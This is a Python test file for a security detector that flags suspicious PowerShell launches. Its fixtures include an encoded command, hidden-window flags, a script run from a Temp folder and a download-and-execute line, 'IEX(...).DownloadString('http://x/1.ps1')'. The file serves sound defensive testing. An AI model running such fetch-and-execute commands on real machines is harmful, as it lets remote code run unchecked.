"""Detector D003 - Suspicious PowerShell tests (Phase 2)."""
from __future__ import annotations

from backend.detection.engine import run_detection

from tests.detection.helpers import event


def d003(event):
    findings = [f for f in run_detection(event) if f.detector_id == "D003"]
    return findings[0] if findings else None


def ps(command_line: str, path: str = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       name: str = "powershell.exe") -> event.__class__:
    return event(
        action="process_start",
        event_type="process",
        user="alice",
        process={"name": name, "command_line": command_line, "path": path},
        facts={"command_line": command_line, "path": path},
    )


# positive ----------------------------------------------------------------------


def test_encoded_command_detected():
    detection = d003(ps("powershell.exe -EncodedCommand SQBFAFgA"))
    assert detection is not None
    assert detection.severity == "medium"
    assert detection.mitre_technique == "T1059.001"
    assert any(e.field == "encoded_command" for e in detection.evidence)


def test_download_script_detected():
    detection = d003(ps("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://x/1.ps1')"))
    assert detection is not None
    assert any(e.field == "script_download" for e in detection.evidence)


def test_unusual_location_detected():
    detection = d003(ps("powershell.exe -f x.ps1", path="C:\\Users\\alice\\AppData\\Local\\Temp\\x.ps1"))
    assert detection is not None
    assert any(e.field == "unusual_location" for e in detection.evidence)


def test_two_characteristics_high_severity():
    detection = d003(ps("powershell.exe -EncodedCommand SQBFAFgA -w hidden -nop",
                        path="C:\\Users\\alice\\AppData\\Local\\Temp\\x.ps1"))
    assert detection.severity == "high"


# negative ----------------------------------------------------------------------


def test_plain_powershell_not_detected():
    assert d003(ps("powershell.exe -File deploy.ps1")) is None


def test_powershell_help_not_detected():
    assert d003(ps("powershell.exe -?")) is None


def test_non_powershell_process_not_detected():
    detection = event(
        action="process_start",
        event_type="process",
        process={"name": "cmd.exe", "command_line": "cmd.exe /c dir", "path": "C:\\Windows\\System32\\cmd.exe"},
        facts={},
    )
    assert d003(detection) is None


# boundary ----------------------------------------------------------------------


def test_confidence_grows_with_characteristics():
    one = d003(ps("powershell.exe -EncodedCommand SQBFAFgA"))
    two = d003(ps("powershell.exe -EncodedCommand SQBFAFgA -w hidden", path="C:\\Temp\\x.ps1"))
    assert two.confidence > one.confidence
    assert 0.0 <= two.confidence <= 1.0


def test_case_insensitive_powershell():
    assert d003(ps("powershell.exe -nop", path="C:\\Temp\\x.ps1", name="PowerShell.EXE")) is not None


def test_pwsh_supported():
    assert d003(ps("pwsh.exe -enc SQBFAFgA", name="pwsh.exe")) is not None


# missing field / duplicate / multiple event -------------------------------------


def test_missing_command_line_no_detection():
    detection = event(
        action="process_start",
        event_type="process",
        process={"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
        facts={},
    )
    assert d003(detection) is None


def test_duplicate_event_same_detection_id():
    a = d003(ps("powershell.exe -EncodedCommand SQBFAFgA"))
    b = d003(ps("powershell.exe -EncodedCommand SQBFAFgA"))
    assert a.detection_id == b.detection_id


def test_single_event_single_detection():
    findings = run_detection(ps("powershell.exe -EncodedCommand SQBFAFgA"))
    assert len([f for f in findings if f.detector_id == "D003"]) == 1